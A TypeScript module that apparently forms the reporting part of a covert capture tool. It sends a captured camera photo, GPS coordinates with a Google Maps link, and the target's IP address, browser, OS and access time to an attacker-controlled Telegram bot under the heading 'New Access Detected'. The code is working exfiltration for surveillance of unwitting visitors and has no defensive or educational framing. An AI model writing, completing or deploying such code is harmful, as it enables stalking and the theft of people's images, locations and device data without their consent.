import axios from 'axios';

const TELEGRAM_API_URL = 'https://api.telegram.org/bot';

export interface DeviceInfo {
  ip: string;
  browser: string;
  os: string;
  timestamp: string;
}

export interface LocationInfo {
  latitude: number;
  longitude: number;
}

export interface CaptureData {
  image: string;
  location: LocationInfo;
  deviceInfo: DeviceInfo;
}

export async function sendTelegramMessage(
  botToken: string,
  chatId: string,
  data: CaptureData
) {
  const message = `
🔍 New Access Detected

📸 Photo: [View Image]
📍 Location: https://www.google.com/maps?q=${data.location.latitude},${data.location.longitude}
🖥️ Device Info:
  • IP: ${data.deviceInfo.ip}
  • Browser: ${data.deviceInfo.browser}
  • OS: ${data.deviceInfo.os}
  • Time: ${data.deviceInfo.timestamp}
`;

  try {
    // First send the message
    await axios.post(`${TELEGRAM_API_URL}${botToken}/sendMessage`, {
      chat_id: chatId,
      text: message,
      parse_mode: 'Markdown'
    });

    // Then send the photo
    await axios.post(`${TELEGRAM_API_URL}${botToken}/sendPhoto`, {
      chat_id: chatId,
      photo: data.image,
      caption: 'Captured Image'
    });
  } catch (error) {
    console.error('Error sending Telegram message:', error);
    throw error;
  }
} 